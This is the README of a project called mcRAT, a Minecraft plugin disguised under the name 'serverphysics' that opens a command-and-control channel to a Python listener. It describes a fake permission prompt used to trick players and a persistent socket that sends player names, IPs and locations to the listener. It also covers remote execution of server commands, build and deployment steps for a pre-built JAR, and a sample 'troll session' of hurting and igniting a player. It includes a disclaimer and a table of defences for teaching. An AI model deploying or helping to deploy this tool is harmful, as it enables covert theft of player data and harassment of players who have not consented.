# mcRAT

a cute little Minecraft C2 dashboard for learning about network traffic, server administration, and cybersecurity. a Bukkit/Paper plugin that talks to a Python terminal listener over TCP.

> **please be nice.** this tool is only for authorized testing, learning, and research. don't deploy it on servers you don't own or have explicit permission to modify. that's not cool and it's illegal.

---

## what is this?

mcRAT is a hands-on tool for cybersecurity students who want to understand how command-and-control frameworks work, using a Minecraft server as the playground.

you'll get to see firsthand how:
- a server-side plugin can silently exfiltrate player data over TCP
- social engineering prompts trick users into "approving" data collection
- a C2 listener can remotely control a compromised server
- persistent connections differ from one-shot beaconing
- server-side APIs can be abused to troll and manipulate players

---

## features

| what | how it works |
|---|---|
| **social engineering prompt** | fake "network interface" permission dialog on player join |
| **persistent C2 channel** | each player who "allows" opens a live socket back to the listener |
| **live player dashboard** | terminal UI showing all connected players with HP, food, location, gamemode, ping |
| **player interaction** | hurt, heal, starve, feed, ignite, freeze, teleport, swap players |
| **chat manipulation** | send colored messages, fake join/quit messages, server-wide broadcasts |
| **server command execution** | run any server command (OP commands, plugin commands, etc.) from the listener |
| **gamemode control** | switch players between survival, creative, adventure, spectator |
| **kick and ban** | remove or ban players remotely |
| **death tracking** | see where each player last died |
| **auto firewall setup** | detects and opens the listener port automatically |
| **cross-platform** | works on Linux, macOS, and Windows (listener side) |

---

## attack patterns & defenses

if you're studying this from a defensive angle, here's what each technique looks like and how to block it:

| technique | what it does | how to defend |
|---|---|---|
| **social engineering prompt** | fake permission dialog tricks players into approving data exfiltration | player education, audit chat plugins |
| **outbound TCP beacon** | plugin opens a socket to an external IP on player join | network monitoring, egress filtering, firewall rules |
| **persistent C2 connection** | live socket allows continuous command/control | IDS detection of long-lived unexpected connections |
| **plugin impersonation** | malicious plugin disguised as a legitimate one | plugin whitelisting, code review, checksum verification |
| **server-side command abuse** | console-level commands executed via plugin | restrict plugin permissions, audit plugin capabilities |
| **player data exfiltration** | player names, IPs, locations sent to external server | monitor outbound traffic for unusual patterns |

---

## project structure

```
mcRAT/
├── serverphysics.java        # Bukkit plugin (Java) - persistent C2 channel
├── serverphysics.jar         # Pre-built plugin JAR (MC 26.2 / Java 25)
├── wizardlistener.py         # Python terminal dashboard + C2 listener
├── MANIFEST.MF               # JAR manifest
├── src/main/resources/
│   ├── plugin.yml            # Bukkit plugin descriptor
│   └── config.yml            # Default config (target-ip, target-port)
└── lib/
    ├── paper-api-26.2.jar    # Paper API 26.2
    ├── adventure-api.jar     # transitive dependency
    ├── adventure-key.jar     # transitive dependency
    └── annotations.jar       # transitive dependency
```

---

## prerequisites

- Java Development Kit (JDK 25+)
- Python 3.7+
- A Paper or Spigot Minecraft server (version 26.2)
- Two machines on the same network (or a public IP for the listener)

---

## installation & usage

### quick start

1. **run the listener** on your machine:
```bash
python3 wizardlistener.py /path/to/minecraft/server
```
it auto-detects your IP, asks for confirmation, and writes the plugin config for you.

2. **restart the Minecraft server** so the plugin loads the config.

3. **join the server** in Minecraft. you'll see a fake permission prompt in chat. type `allow` in chat.

4. **use the dashboard** to see players, select them, and run commands.

### manual setup

if you don't have the server path, just run:
```bash
python3 wizardlistener.py
```
it'll print your IP and tell you to set it manually in `plugins/serverphysics/config.yml`:
```yaml
target-ip: "192.168.1.50"
target-port: 5002
```

### the dashboard

once a player connects, you get a live terminal UI:

```
============================================
  serverphysics | Listening on 0.0.0.0:5002
============================================
  ONLINE PLAYERS (2)
  ------------------------------------------
     [1] plutojupiter  HP:20  Food:20  overworld
        IP: 192.168.1.100  Ping: 42ms  GM: SURVIVAL
        Loc: 42.1 / 71.0 / 64.5

   > [2] Steve          HP:14  Food:15  overworld
        IP: 10.0.0.55  Ping: 87ms  GM: SURVIVAL
        Loc: -120.3 / 65.0 / 88.1
============================================
  COMMANDS
  ------------------------------------------
  select <#>            select a player by number
  hurt <amt>            deal damage
  heal                  full health
  starve                empty hunger bar
  feed                  fill hunger bar
  msg <color> <text>    send colored message
  fakejoin <name>       fake a join message
  fakequit <name>       fake a quit message
  tp <x> <y> <z>        teleport player
  gamemode <mode>       change gamemode
  kick <reason>         kick player
  ban <reason>          ban player
  ignite <secs>         set player on fire
  freeze                toggle freeze
  swap <player>         swap positions
  cmd <command>         run server command
  say <message>         broadcast message
  location              get player location
  death                 last death location
  refresh               refresh all player info
  quit                  exit
============================================
  Selected: Steve
  >
```

### example troll session

```
> select 1
  [*] Selected: plutojupiter

> hurt 19
  [*] Hitting plutojupiter for 19 damage

> msg RED you are now on fire :)
  [*] Sending RED message to plutojupiter

> ignite 10
  [*] Setting plutojupiter on fire for 10s

> fakejoin Herobrine
  [*] Faked join: Herobrine

> say plutojupiter has been chosen
  [*] Broadcast: plutojupiter has been chosen
```

---

## building from source

a pre-built `serverphysics.jar` is included. to rebuild:

```bash
export JAVA_HOME=/usr/lib/jvm/java-26-openjdk
CP="lib/paper-api-26.2.jar:lib/adventure-api.jar:lib/adventure-key.jar:lib/annotations.jar"

mkdir -p out/com/example/wizard
cp serverphysics.java /tmp/InfectedServer.java
$JAVA_HOME/bin/javac --release 25 -cp "$CP" -d out /tmp/InfectedServer.java

cp src/main/resources/plugin.yml out/
cp src/main/resources/config.yml out/
$JAVA_HOME/bin/jar cmf MANIFEST.MF serverphysics.jar -C out com/ -C out plugin.yml -C out config.yml
rm -rf out /tmp/InfectedServer.java
```

---

## for instructors & students

this is a compact single-file Bukkit plugin + Python listener that works well as a classroom exercise:

- **C2 architecture** -- study how the plugin maintains a persistent connection and processes remote commands
- **social engineering** -- the fake permission prompt demonstrates how users are tricked into approving malicious behavior
- **network forensics** -- capture traffic with Wireshark and analyze the TCP protocol between plugin and listener
- **defensive tooling** -- write firewall rules or IDS signatures to detect the outbound beacon
- **plugin security** -- examine how a malicious plugin can abuse server-side APIs
- **thread safety** -- study the Python listener's use of locks for concurrent player management
- **event-driven programming** -- the plugin hooks into Bukkit events (join, quit, death, move) to react to server state

---

## license

MIT License
